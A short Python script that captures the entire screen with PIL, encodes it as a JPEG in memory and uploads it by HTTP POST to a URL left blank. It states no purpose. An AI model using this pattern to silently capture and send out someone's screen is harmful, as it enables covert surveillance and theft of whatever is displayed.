import requests
import io as BytesIO
from PIL import ImageGrab

image = ImageGrab.grab()
print(type(image))
image_buffer = BytesIO.BytesIO()
image.save(image_buffer, format='JPEG')
byte_image = image_buffer.getvalue()

url = ''
files = {'media': byte_image}
requests.post(url, files=files)